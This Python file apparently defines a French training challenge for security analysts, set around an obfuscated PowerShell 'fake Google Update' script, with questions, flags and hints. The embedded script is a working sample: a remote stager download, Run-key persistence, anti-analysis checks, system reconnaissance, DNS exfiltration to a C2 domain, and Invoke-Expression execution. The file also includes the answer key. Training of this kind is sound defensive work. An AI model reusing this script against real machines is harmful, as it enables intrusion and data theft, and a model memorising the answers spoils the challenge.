"""
Challenge 6 ‚Äî Analyse de Script Malveillant (PowerShell Obfusqu√©)
Niveau : 2 (Analyste Confirm√©)
Cat√©gorie : Malware
"""

ARTIFACT_MALWARE_SCRIPT = r"""
# Fichier r√©cup√©r√©: C:\Users\j.martin\AppData\Local\Temp\update_checker.ps1
# SHA256: 7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b
# Taille: 2,847 bytes
# Date de modification: 2026-02-18 08:33:45

# --- D√©but du script ---

Set-Variable -Name 'x0' -Value ([char[]](83,121,115,116,101,109,46,78,101,116,46,87,101,98,67,108,105,101,110,116) -join '')
Set-Variable -Name 'x1' -Value ([char[]](68,111,119,110,108,111,97,100,83,116,114,105,110,103) -join '')
Set-Variable -Name 'x2' -Value ([char[]](73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) -join '')

$enc_url = "aHR0cDovLzE4NS4yMzQuNzIuMTk6ODA4MC9zdGFnZXIucHMx"
$url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($enc_url))

$wc = New-Object $x0
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$wc.Headers.Add("X-Request-ID", "REDPAWN-WKS-COMPTA-PC03")
$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

$payload = $wc.$x1($url)

# Persistence via registre
$rpath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$rname = "GoogleChromeAutoUpdate"
$rvalue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:LOCALAPPDATA\Temp\update_checker.ps1`""
Set-ItemProperty -Path $rpath -Name $rname -Value $rvalue -ErrorAction SilentlyContinue

# Anti-analyse
$checks = @(
    (Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|VirtualBox",
    (Get-Process | Where-Object {$_.ProcessName -match "wireshark|procmon|x64dbg|ida"}).Count -gt 0,
    (Get-WmiObject Win32_BIOS).SerialNumber -eq "0"
)

if ($checks -contains $true) {
    Remove-Item $MyInvocation.MyCommand.Path -Force
    exit
}

# Collecte d'informations
$info = @{
    "hostname" = $env:COMPUTERNAME
    "username" = $env:USERNAME
    "domain"   = $env:USERDOMAIN
    "os"       = (Get-WmiObject Win32_OperatingSystem).Caption
    "ip"       = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -ne "Loopback"}).IPAddress
    "av"       = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct).displayName
    "admins"   = (net localgroup Administrators) -join ","
}

$json = $info | ConvertTo-Json -Compress
$bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
$encoded = [Convert]::ToBase64String($bytes)

# Exfiltration via DNS
$chunks = [regex]::Matches($encoded, '.{1,63}')
foreach ($chunk in $chunks) {
    try {
        Resolve-DnsName -Name "$($chunk.Value).data.c2-update-service.xyz" -Type TXT -ErrorAction SilentlyContinue
    } catch {}
    Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
}

# Ex√©cution du stage 2
& $x2 $payload

# --- Fin du script ---
"""

CHALLENGE = {
    "id": "c06_malware_script",
    "title": "ü¶† Le Faux Google Update",
    "category": "malware",
    "level": 2,
    "points_total": 380,
    "estimated_time": "35-50 min",
    "story": """
## üìã Briefing de Mission

**Date :** 18 f√©vrier 2026, 15h00  
**Priorit√© :** HAUTE  
**Source :** Corr√©lation investigation ‚Äî T√¢che planifi√©e suspecte (SIEM-2026-4401)

---

En investiguant l'alerte de la t√¢che planifi√©e suspecte sur **WKS-COMPTA-PC03**, l'analyste N2 a r√©cup√©r√© le script PowerShell ex√©cut√© par la t√¢che.

Le script utilise plusieurs techniques d'obfuscation. Vous devez l'analyser en profondeur :

> *"On a r√©cup√©r√© le payload PowerShell de la t√¢che planifi√©e 'GoogleUpdate'. C'est obfusqu√© mais pas trop. Analyse-le et dis-moi ce qu'il fait, comment il persiste, comment il exfiltre, et quels sont les IoC."*

**Indice technique :** Les valeurs num√©riques dans les `[char[]]` sont des codes ASCII. Vous pouvez les convertir pour comprendre le contenu obfusqu√©.
    """,
    "artifacts": [
        {
            "name": "update_checker.ps1",
            "type": "code",
            "content": ARTIFACT_MALWARE_SCRIPT,
            "description": "Script PowerShell malveillant r√©cup√©r√© depuis WKS-COMPTA-PC03"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "D√©codez la variable $x0 (les codes ASCII). Quelle classe .NET est utilis√©e pour le t√©l√©chargement ?",
            "answer": "System.Net.WebClient",
            "flag": "FLAG{System.Net.WebClient}",
            "points": 40,
            "hints": [
                "Convertissez les codes ASCII : 83=S, 121=y, 115=s, 116=t, ...",
                "C'est une classe .NET tr√®s utilis√©e pour faire des requ√™tes HTTP"
            ],
            "hint_cost": 13
        },
        {
            "id": "q2",
            "text": "D√©codez l'URL C2 encod√©e en Base64 ($enc_url). Quelle est l'URL compl√®te ?",
            "answer": "http://185.234.72.19:8080/stager.ps1",
            "flag": "FLAG{http://185.234.72.19:8080/stager.ps1}",
            "points": 50,
            "hints": [
                "D√©codez la cha√Æne Base64 'aHR0cDovLzE4NS4yMzQuNzIuMTk6ODA4MC9zdGFnZXIucHMx'",
                "Utilisez : echo 'aHR0cDov...' | base64 -d"
            ],
            "hint_cost": 17
        },
        {
            "id": "q3",
            "text": "Sous quel nom la persistence est-elle configur√©e dans le registre ?",
            "answer": "GoogleChromeAutoUpdate",
            "flag": "FLAG{GoogleChromeAutoUpdate}",
            "points": 40,
            "hints": [
                "Cherchez la cl√© de registre Run dans le script",
                "Elle imite une mise √† jour automatique d'un navigateur"
            ],
            "hint_cost": 13
        },
        {
            "id": "q4",
            "text": "Quels 4 outils d'analyse le script d√©tecte-t-il pour son anti-analyse ? (s√©par√©s par des virgules, par ordre alphab√©tique)",
            "answer": "ida,procmon,wireshark,x64dbg",
            "flag": "FLAG{ida,procmon,wireshark,x64dbg}",
            "points": 50,
            "hints": [
                "Cherchez le Get-Process avec un -match dans la section anti-analyse",
                "Ce sont des outils de reverse engineering et d'analyse r√©seau/syst√®me"
            ],
            "hint_cost": 17
        },
        {
            "id": "q5",
            "text": "Quel domaine est utilis√© pour l'exfiltration DNS ?",
            "answer": "c2-update-service.xyz",
            "flag": "FLAG{c2-update-service.xyz}",
            "points": 50,
            "hints": [
                "Cherchez Resolve-DnsName dans le script",
                "Le domaine est dans la partie .data.DOMAINE"
            ],
            "hint_cost": 17
        },
        {
            "id": "q6",
            "text": "Quel type de requ√™te DNS est utilis√© pour l'exfiltration ?",
            "answer": "TXT",
            "flag": "FLAG{TXT}",
            "points": 30,
            "hints": [
                "Regardez le param√®tre -Type dans Resolve-DnsName"
            ],
            "hint_cost": 10
        },
        {
            "id": "q7",
            "text": "Quelle information identifiant la victime est envoy√©e dans le header HTTP X-Request-ID ?",
            "answer": "REDPAWN-WKS-COMPTA-PC03",
            "flag": "FLAG{REDPAWN-WKS-COMPTA-PC03}",
            "points": 30,
            "hints": [
                "Cherchez X-Request-ID dans les headers ajout√©s au WebClient"
            ],
            "hint_cost": 10
        },
        {
            "id": "q8",
            "text": "La variable $x2 d√©obfusqu√©e correspond √† quel cmdlet PowerShell ?",
            "answer": "Invoke-Expression",
            "flag": "FLAG{Invoke-Expression}",
            "points": 40,
            "hints": [
                "D√©codez les codes ASCII: 73=I, 110=n, 118=v, 111=o, ...",
                "C'est le cmdlet le plus dangereux de PowerShell, utilis√© pour ex√©cuter du code dynamique"
            ],
            "hint_cost": 13
        },
        {
            "id": "q9",
            "text": "Quelle technique de persistence sp√©cifique est utilis√©e ? (cl√© de registre compl√®te)",
            "answer": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "flag": "FLAG{HKCU_CurrentVersion_Run}",
            "points": 50,
            "hints": [
                "Cherchez $rpath dans le script",
                "C'est la cl√© de registre classique pour l'auto-d√©marrage utilisateur"
            ],
            "hint_cost": 17
        }
    ]
}
